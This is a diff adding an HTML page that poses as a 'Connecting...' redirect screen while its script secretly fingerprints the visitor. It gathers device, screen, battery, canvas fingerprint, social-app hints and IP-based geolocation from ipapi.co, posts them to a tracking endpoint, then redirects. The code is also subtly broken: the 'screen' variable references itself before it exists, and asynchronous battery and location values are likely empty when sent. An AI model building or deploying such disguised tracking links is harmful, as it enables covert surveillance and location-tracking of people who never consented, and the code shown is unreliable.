@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connecting...</title>
+<style>
+body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace}
+.spinner{width:48px;height:48px;border:3px solid #00ff9d;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+p{color:#00ff9d;margin-top:16px;letter-spacing:2px;font-size:12px}
+</style>
+</head>
+<body>
+<div style="text-align:center"><div class="spinner"></div><p>CONNECTING...</p></div>
+<script>
+(function(){
+  const params = new URLSearchParams(window.location.search);
+  const slug = params.get('s');
+  if (!slug) { window.location.href = '#'; return; }
+
+  // Collect data
+  const ua = navigator.userAgent;
+  const device = /Mobi|Android/i.test(ua) ? /Android/i.test(ua) ? 'Android' : 'iOS' : 'Desktop';
+  const screen = screen.width + 'x' + screen.height + ' ' + screen.colorDepth + 'bit';
+  const ip = 'via-server'; // Server gets real IP
+
+  // Battery
+  let battery = null;
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => { battery = { level: Math.round(b.level*100)+'%', charging: b.charging }; });
+  }
+
+  // Canvas fingerprint
+  let canvasFP = '';
+  try {
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60'; ctx.fillRect(120, 1, 60, 20);
+    ctx.fillStyle = '#069'; ctx.fillText('SpyLink', 2, 15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('SpyLink', 4, 17);
+    const data = c.toDataURL();
+    let h = 0; for (let i = 0; i < data.length; i++) { h = (h << 5) - h + data.charCodeAt(i); h |= 0; }
+    canvasFP = Math.abs(h).toString(16).padStart(8, '0');
+  } catch(e) {}
+
+  // Apps detection
+  const apps = [];
+  const lower = ua.toLowerCase();
+  if (/whatsapp/.test(lower)) apps.push('WhatsApp');
+  if (/instagram/.test(lower)) apps.push('Instagram');
+  if (/facebook/.test(lower)) apps.push('Facebook');
+  if (/twitter|x-twitter/.test(lower)) apps.push('Twitter/X');
+  if (/telegram/.test(lower)) apps.push('Telegram');
+  if (/tiktok/.test(lower)) apps.push('TikTok');
+
+  // Get geo via ipapi
+  let geo = null;
+  fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
+    .then(r => r.json()).then(d => { geo = { city: d.city, region: d.region, country: d.country_name, lat: d.latitude, lon: d.longitude }; })
+    .catch(() => {});
+
+  // Send to server
+  fetch('/api/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ slug, ip, geo, screen, battery, canvas: canvasFP, ua, device, apps })
+  }).catch(() => {});
+
+  // Redirect after delay
+  setTimeout(() => { window.location.href = '#'; }, 800 + Math.random() * 700);
+})();
+</script>
+</body>
+</html>
